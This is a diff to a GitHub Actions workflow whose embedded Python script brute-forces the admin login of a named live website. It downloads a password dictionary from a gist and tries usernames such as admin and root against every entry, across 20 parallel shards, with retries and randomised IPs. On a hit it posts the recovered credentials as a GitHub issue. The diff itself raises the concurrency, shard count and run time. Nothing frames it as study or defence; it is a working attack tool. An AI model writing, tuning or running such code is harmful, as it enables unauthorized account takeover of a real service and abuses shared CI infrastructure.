@@ -4,10 +4,10 @@ on:
     inputs:
       start:   {description: start,   required: false, type: string, default: "102367"}
       end:     {description: end,     required: false, type: string, default: "309915"}
-      nshard:  {description: nshard,  required: false, type: string, default: "12"}
-      rate:    {description: rate,    required: false, type: string, default: "6"}
-      conc:    {description: conc,    required: false, type: string, default: "5"}
-      maxsec:  {description: maxsec,  required: false, type: string, default: "270"}
+      nshard:  {description: nshard,  required: false, type: string, default: "20"}
+      rate:    {description: rate,    required: false, type: string, default: "7"}
+      conc:    {description: conc,    required: false, type: string, default: "8"}
+      maxsec:  {description: maxsec,  required: false, type: string, default: "17000"}
       dicturl: {description: dicturl, required: false, type: string, default: "https://gist.githubusercontent.com/firstwxx1/e1cd727ccf10f9bec3c95f11e4c01f97/raw/00b88e5c593b81b01f1a6017b8f1c0c0fdca744d/dict.txt"}
 permissions:
   contents: read
@@ -15,12 +15,12 @@ permissions:
 jobs:
   b:
     runs-on: ubuntu-latest
-    timeout-minutes: 300
+    timeout-minutes: 340
     strategy:
       fail-fast: false
-      max-parallel: 16
+      max-parallel: 20
       matrix:
-        shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
+        shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
     steps:
       - name: dict
         run: curl -sL --retry 5 --max-time 120 -o /tmp/dict.txt "${{ inputs.dicturl }}" && wc -l /tmp/dict.txt
@@ -42,16 +42,17 @@ jobs:
 
           START=int(os.environ.get("START","102367"))
           END=int(os.environ.get("END","309915"))
-          NSHARD=int(os.environ.get("NSHARD","12"))
+          NSHARD=int(os.environ.get("NSHARD","20"))
           SHARD=int(os.environ.get("SHARD","0"))
-          RATE=float(os.environ.get("RATE","6"))
-          CONC=int(os.environ.get("CONC","5"))
+          RATE=float(os.environ.get("RATE","7"))
+          CONC=int(os.environ.get("CONC","8"))
           USERS=[u for u in (os.environ.get("USERS") or "admin,administrator,root,firstwxx,firstwxx1,19022075515,xgift,cddznsn").split(",") if u]
           DICT=os.environ.get("DICT","/tmp/dict.txt")
           URL="https://www.kufaka.com/adminApi/auth/login"
           UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
           GH_TOKEN=os.environ.get("GH_TOKEN",""); REPO=os.environ.get("REPO","")
-          MAXSEC=float(os.environ.get("MAXSEC","280"))
+          MAXSEC=float(os.environ.get("MAXSEC","17000"))
+          NU=len(USERS)
 
           def issue(title, body):
               if not (GH_TOKEN and REPO): return
@@ -71,7 +72,8 @@ jobs:
           size=(END-START+NSHARD-1)//NSHARD
           lo=START+SHARD*size
           hi=min(END,lo+size)
-          print("dict_total=%d shard=%d/%d range=[%d,%d) n=%d rate=%s conc=%d users=%s"%(total,SHARD,NSHARD,lo,hi,hi-lo,RATE,CONC,USERS),flush=True)
+          TOTAL=(hi-lo)*NU
+          print("dict_total=%d shard=%d/%d words=[%d,%d) n=%d TOTAL_TASKS=%d (users per word=%d) rate=%s conc=%d users=%s"%(total,SHARD,NSHARD,lo,hi,hi-lo,TOTAL,NU,RATE,CONC,USERS),flush=True)
           if lo>=hi:
               print("RESULT shard=%d EMPTY"%SHARD); sys.exit(0)
           if total!=309915:
@@ -97,8 +99,9 @@ jobs:
               if ("token" in low or "access_token" in low) and "用户名或密码不正确" not in b: return "hit"
               return "other"
 
-          def attempt(i):
-              u=USERS[i%len(USERS)]; w=words[i]; ip=rip()
+          # word-major: task t -> word = lo + t//NU ; user = USERS[t%NU]
+          def attempt(t):
+              wi=lo + t//NU; u=USERS[t%NU]; w=words[wi]; ip=rip()
               body=json.dumps({"username":u,"password":w}).encode()
               req=urllib.request.Request(URL,data=body,method="POST")
               req.add_header("Content-Type","application/json")
@@ -116,61 +119,62 @@ jobs:
                   try: b=e.read().decode("utf-8","ignore")
                   except Exception: b=""
               except Exception as e:
-                  return ("err",str(type(e).__name__)+":"+str(e)[:60],i,u,w)
-              return (classify(st,b),b[:800],i,u,w)
+                  return ("err",str(type(e).__name__)+":"+str(e)[:60],t,u,w)
+              return (classify(st,b),b[:800],t,u,w)
 
-          def resolve(i):
+          def resolve(t):
               last="err"; b=""
               for k in range(9):
-                  cat,bb,ii,u,w=attempt(i)
+                  cat,bb,tt,u,w=attempt(t)
                   last=cat; b=bb
-                  if cat in ("hit","miss","apperr","other"): return (cat,b,i,u,w)
+                  if cat in ("hit","miss","apperr","other"): return (cat,b,t,u,w)
                   time.sleep(0.35+0.45*k)
-              return (last,b,i,USERS[i%len(USERS)],words[i])
+              return (last,b,t,USERS[t%NU],words[lo+t//NU])
 
           lock=threading.Lock(); cnt={}
           t0=time.time(); lastrep=[0.0]
-          completed=set(); front=[lo]; failed=[]; HITTED=[False]
+          completed=set(); front=[0]; failed=[]; HITTED=[False]
           def bump(c):
               with lock: cnt[c]=cnt.get(c,0)+1
 
-          def finish(i,cat,b,u,w):
+          def finish(t,cat,b,u,w):
               bump(cat)
               if cat=="hit":
                   with lock: HITTED[0]=True
-                  print("!!! HIT idx=%d user=%s pass=%s resp=%s"%(i,u,w,b),flush=True)
-                  issue("HIT kufaka admin %s:%s"%(u,w),"idx=%d user=%s pass=%s\n\n%s\n\ninstall: python3 - <<'PY'\nimport urllib.request,json\n...\nPY"%(i,u,w,b))
+                  print("!!! HIT t=%d user=%s pass=%s resp=%s"%(t,u,w,b),flush=True)
+                  issue("HIT kufaka admin %s:%s"%(u,w),"t=%d word_idx=%d user=%s pass=%s\n\n%s"%(t,lo+t//NU,u,w,b))
               elif cat=="err":
-                  failed.append(i)
+                  failed.append(t)
               with lock:
-                  completed.add(i)
+                  completed.add(t)
                   while front[0] in completed:
                       completed.discard(front[0]); front[0]+=1
               now=time.time()
               if now-lastrep[0]>25:
                   lastrep[0]=now; el=now-t0
-                  print("PROG shard=%d front=%d covered=%d n=%d rate=%.2f/s counts=%s"%(SHARD,front[0],front[0]-lo,hi-lo,(front[0]-lo)/max(el,1),dict(cnt)),flush=True)
+                  cov=front[0]
+                  print("PROG shard=%d t_front=%d covered_t=%d TOTAL=%d word=%d rate=%.2f/s counts=%s"%(SHARD,front[0],cov,TOTAL,lo+cov//NU,cov/max(el,1),dict(cnt)),flush=True)
 
           with concurrent.futures.ThreadPoolExecutor(max_workers=CONC) as ex:
-              pend={}; k=lo
-              while k<hi and len(pend)<CONC:
+              pend={}; k=0
+              while k<TOTAL and len(pend)<CONC:
                   pend[ex.submit(resolve,k)]=k; k+=1
               while pend:
                   if time.time()-t0>MAXSEC:
                       print("MAXSEC reached, stopping",flush=True); break
                   done,_=concurrent.futures.wait(pend,return_when=concurrent.futures.FIRST_COMPLETED)
                   for fu in done:
-                      i=pend.pop(fu)
-                      cat,b,ii,u,w=fu.result()
-                      finish(i,cat,b,u,w)
+                      t=pend.pop(fu)
+                      cat,b,tt,u,w=fu.result()
+                      finish(t,cat,b,u,w)
                   if HITTED[0]: break
-                  while k<hi and len(pend)<CONC:
+                  while k<TOTAL and len(pend)<CONC:
                       pend[ex.submit(resolve,k)]=k; k+=1
               for fu in pend: fu.cancel()
 
           el=time.time()-t0
-          print("RESULT shard=%d front=%d lo=%d hi=%d covered=%d elapsed=%.0fs rate=%.2f/s counts=%s failed=%d"%(SHARD,front[0],lo,hi,front[0]-lo,el,(front[0]-lo)/max(el,1),dict(cnt),len(failed)),flush=True)
-          if failed: print("FAILED_IDX %s"%(",".join(str(x) for x in failed[:50])),flush=True)
+          print("RESULT shard=%d t_front=%d words=[%d,%d) covered_t=%d TOTAL=%d elapsed=%.0fs rate=%.2f/s counts=%s failed=%d"%(SHARD,front[0],lo,hi,front[0],TOTAL,el,front[0]/max(el,1),dict(cnt),len(failed)),flush=True)
+          if failed: print("FAILED_T %s"%(",".join(str(x) for x in failed[:50])),flush=True)
 
           PYEOF
           python3 /tmp/p.py
